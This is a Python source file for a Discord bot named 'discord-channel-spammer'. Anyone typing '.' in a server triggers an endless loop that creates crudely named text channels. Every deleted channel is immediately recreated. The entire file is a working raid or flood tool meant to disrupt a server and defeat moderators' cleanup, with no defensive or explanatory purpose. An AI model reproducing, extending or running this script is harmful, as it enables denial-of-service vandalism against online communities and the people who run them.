import discord
from discord.ext.commands import Bot
from discord.ext import commands
import asyncio

Client = discord.Client()
bot = commands.Bot(command_prefix="%")


@bot.event
async def on_ready():
    print("discord-channel-spammer Bot is ready")
    print("Client: " + bot.user.name)
    print("ID: " + bot.user.id)


@bot.event
async def on_message(message):
    if message.content == ".":
        print("started spamming on " + message.server.name)
        count = 0
        while True:
            await bot.create_channel(message.server, str(count) + "foreskin", type=discord.ChannelType.text)
            count += 1


@bot.event
async def on_channel_delete(channel):
    await bot.create_channel(channel.server, "foreskin", type=discord.ChannelType.text)


token_file = open('token.txt', 'r')
token = token_file.readline().replace('\n', '')
token_file.close()
bot.run(token)
